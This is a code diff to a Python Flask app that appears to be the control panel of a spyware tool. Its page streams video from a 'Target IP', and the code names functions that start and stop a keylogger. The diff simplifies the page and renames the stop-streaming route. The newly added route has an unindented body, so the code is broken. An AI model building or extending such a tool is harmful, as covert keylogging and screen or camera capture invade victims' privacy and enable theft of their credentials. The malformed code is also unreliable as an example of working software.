@@ -22,57 +22,26 @@ html_template = """
 <html lang="en">
   <head>
     <title>Video Streaming</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-      }
-      .button {
-        display: inline-block;
-        padding: 10px 20px;
-        margin-top: 20px;
-        background-color: #007bff;
-        color: white;
-        text-align: center;
-        border-radius: 5px;
-        text-decoration: none;
-      }
-      .button:hover {
-        background-color: #0056b3;
-      }
-      .content {
-        max-width: 800px;
-        margin: 0 auto;
-        padding: 20px;
-        text-align: center;
-      }
-      .stream-info {
-        margin-bottom: 20px;
-      }
-      img {
-        width: 640px;
-        height: 480px;
-      }
-    </style>
   </head>
   <body>
-    <div class="content">
-      <h1>Video Streaming</h1>
-
-      <!-- Description Section -->
-      <div class="stream-info">
-        <p><strong>Target IP :</strong> {{ target_ip }}</p>
-        <p><strong>Start Time :</strong> {{ start_time }}</p>
-      </div>
-      
-      <!-- Video Stream Section -->
-      <div>
-        <img src="{{ url_for('video_feed') }}" width="640" height="480">
-      </div>
-
-      <!-- Stop Stream Button -->
-      <div>
-        <a href="{{ url_for('stop_stream') }}" class="button">Stop Stream</a>
-      </div>
+    <h1>Video Streaming</h1>
+    
+    <!-- Description Section -->
+    <div>
+      <p><strong>Target IP :</strong> {{ target_ip }}</p>
+      <p><strong>Start Time :</strong> {{ start_time }}</p>
+    </div>
+    
+    <!-- Video Stream Section -->
+    <div>
+      <img src="{{ url_for('video_feed') }}" width="640" height="480">
+    </div>
+    
+    <!-- Stop Streaming Section -->
+    <div>
+      <a href="{{ url_for('stop_streaming') }}">
+        <button>Stop Streaming</button>
+      </a>
     </div>
   </body>
 </html>
@@ -129,11 +98,12 @@ def start_keylogger():
         keylogger_running = True
         print(Fore.YELLOW + "[ * ] Keylogger started.")
 
-    @app.route('/stop_stream')
-    def stop_stream():
-        global streaming
-        streaming = False  # Stop streaming
-        return "Streaming stopped!"
+    @app.route('/stop_streaming')
+    def stop_streaming():
+    global streaming
+    streaming = False  # Stop streaming
+    print(Fore.RED + "[ * ] Stopping streaming...")
+    return redirect(url_for('index'))
 
 
 def stop_keylogger():
